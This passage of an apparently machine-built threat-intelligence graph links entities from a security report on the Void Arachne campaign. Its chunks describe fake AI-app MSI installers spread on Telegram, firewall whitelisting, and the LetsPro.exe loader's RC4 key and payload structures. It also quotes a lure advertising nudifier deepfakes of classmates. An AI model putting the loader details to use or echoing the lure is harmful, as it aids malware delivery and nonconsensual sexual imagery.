kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--telegram-channel",
      "target": "procedure--telegram-malware-distribution",
      "confidence": 0.95,
      "evidence": "Telegram频道用于托管和分发恶意软件",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "报告记录了通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了攻击活动",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "technique--spearphishing",
      "confidence": 0.9,
      "evidence": "攻击活动使用鱼叉式网络钓鱼技术",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--ai-voice-face-cloning",
      "target": "tool--malicious-msi",
      "confidence": 0.9,
      "evidence": "AI语音和面部克隆程序使用恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--ai-voice-face-cloning",
      "target": "tool--ai-app-installer",
      "confidence": 0.95,
      "evidence": "AI语音和面部克隆程序使用AI应用安装程序",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--letvpn-msi",
      "confidence": 0.95,
      "evidence": "报告分析了letvpn.msi文件",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--dll-installation",
      "target": "tool--letvpn-msi",
      "confidence": 0.95,
      "evidence": "安装过程使用letvpn.msi文件",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--dll-installation",
      "target": "tool--dll",
      "confidence": 0.95,
      "evidence": "安装过程使用动态链接库",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--firewall-config",
      "target": "tool--netfirewall-dll",
      "confidence": 0.95,
      "evidence": "防火墙配置过程使用NetFirewall.dll",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--letspro-execution",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "执行过程使用LetsPro.exe加载器",
      "chunks_info": [
        {
          "chunk_id": 11,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
          "chunk_length": 1378,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "text",
            "token_length": 261,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 11,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--letvpn-msi",
      "confidence": 0.95,
      "evidence": "报告分析了*Letvpn* MSI文件",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--letspro-exe-loader",
      "confidence": 0.95,
      "evidence": "报告分析了LetsPRO.exe (Loader)文件",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "报告分析了LetsPRO.exe文件",
      "chunks_info": [
        {
          "chunk_id": 12,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
          "chunk_length": 576,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### *Letvpn* MSI analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### *Letvpn* MSI analysis"
            ],
            "content_type": "table",
            "token_length": 168,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 12,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "报告分析了工具LetsPro.exe",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
          "chunk_length": 1313,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Trojan loader *LetsPro.exe* analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Trojan loader *LetsPro.exe* analysis"
            ],
            "content_type": "text",
            "token_length": 273,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 14,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "procedure--payload-decryption",
      "target": "tool--letspro-exe",
      "confidence": 0.95,
      "evidence": "Trojan loader LetsPro.exe applies the payload decryption process",
      "chunks_info": [
        {
          "chunk_id": 14,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet 